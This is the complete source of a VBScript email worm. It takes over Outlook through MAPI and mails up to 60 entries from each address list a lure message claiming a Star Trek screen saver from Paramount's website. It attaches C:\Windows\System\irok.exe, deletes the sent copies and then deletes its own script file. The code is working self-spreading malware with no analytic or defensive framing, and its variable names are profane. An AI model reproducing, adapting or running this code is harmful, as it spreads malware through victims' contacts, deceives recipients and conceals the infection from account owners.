on error resume next
Set IroKNow = CreateObject("outlook.application")
If IroKNow <> "" Then
Set Letsgo = IroKNow.GetNameSpace("MAPI")
For damnit = 1 To Letsgo.AddressLists.Count
Set ahshit = Letsgo.AddressLists(damnit)
fuckina = 1
Set fucku = IroKNow.CreateItem(0)
For argh = 1 To ahshit.AddressEntries.Count
holyshitzor = ahshit.AddressEntries(fuckina)
fucku.Recipients.Add holyshitzor
fuckina = fuckina + 1
If fuckina > 60 Then Exit For
Next
fucku.Subject = "I thought you might like to see this."
fucku.Body = "I thought you might like this. I got it from paramount pictures website. It's a startrek screen saver."
fucku.Attachments.Add "C:\Windows\System\irok.exe"
fucku.DeleteAfterSubmit = True
fucku.Send
holyshitzor = ""
Next
End If
Set Laterz = CreateObject("Scripting.FileSystemObject")
Laterz.DeleteFile Wscript.ScriptFullName
